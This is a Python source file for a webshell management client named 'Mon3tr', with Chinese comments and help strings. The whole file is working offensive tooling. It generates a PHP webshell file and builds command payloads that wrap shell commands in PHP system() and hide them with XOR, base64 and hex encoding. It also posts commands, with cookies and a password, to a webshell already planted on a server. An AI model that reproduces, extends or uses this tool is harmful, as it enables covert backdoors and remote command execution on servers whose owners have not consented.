"""  
@Time: 2024/3/6 9:58 
@Auth: Y5neKO
@File: console.py 
@IDE: PyCharm 
"""
import argparse
import os

import requests
import base64

from core.color import *
from core.general import *


# def request(url, payload):
#     headers = {"Content-Type": "application/json;charset=gbk"}
#     cookies = {"user_token": payload}
#     response = requests.get(url=url, headers=headers, cookies=cookies)
#     response.encoding = "gbk"
#     return response.text


def parse_cookies_from_str(cookie_str):
    """将 cookie 字符串解析为字典"""
    cookies = {}
    for item in cookie_str.split(';'):
        key, value = item.strip().split('=', 1)
        cookies[key] = value
    return cookies


def xor_decode(string, key):
    str_length = len(string)
    key_length = len(key)
    tmp = 0
    result = ""

    for i in range(0, str_length):
        result += chr(ord(string[i]) ^ ord(key[tmp]))

        if tmp + 1 < key_length:
            tmp += 1
        else:
            tmp = 0

    return result


def payload_generate(cmd, key):
    payload = xor_decode("system('" + cmd + "');", key)
    payload = base64.b64encode(payload.encode("utf-8"))
    payload = payload.hex()
    print(payload)
    return payload


def main():
    parse = argparse.ArgumentParser(description="Mon3tr Webshell Management Client",
                                    formatter_class=argparse.RawTextHelpFormatter)

    parse.add_argument("-g", "--generate_webshell", action="store", type=str,
                       help="生成webshell的文件名")
    parse.add_argument("-w", "--webshell", action="store", type=str, help="webshell路径")
    parse.add_argument("--cookie", action="store", type=str, help="Cookie值(格式: User=123;Pass=456)")
    parse.add_argument("-p", "--password", action="store", type=str, help="Webshell密码")
    parse.add_argument("-x", "--xor", action="store", type=str, help="xor加密key")
    parse.add_argument("-c", "--cmd", action="store", type=str, help="执行命令")

    # 接收命令行参数解析后的参数
    args = parse.parse_args()

    if args.generate_webshell is not None:
        print("------------------------------开始任务------------------------------")
        webshell_dir = args.generate_webshell
        webshell_data = gen_php_webshell()
        with open(webshell_dir, 'w') as f:
            f.write(webshell_data[0])
        print("生成成功, 路径为: " + os.path.abspath(webshell_dir))
        print(webshell_data[1])
        print("------------------------------任务结束------------------------------")

    if args.webshell is not None:
        print("------------------------------开始任务------------------------------")
        if args.cookie is not None and args.password is not None and args.cmd is not None:
            cookies = parse_cookies_from_str(args.cookie) if args.cookie else {print("Cookie格式错误")}
            print("webshell地址：" + args.webshell)
            print("Cookie: " + str(cookies))
            print("Passowrd: " + args.password + "=" + args.cmd)
            response = requests.post(url=args.webshell, cookies=cookies, data=args.password + "=" + args.cmd)
            print(response)
            print(response.text)
        else:
            print("[" + color("+", "red") + "]缺少参数")
        print("------------------------------任务结束------------------------------")
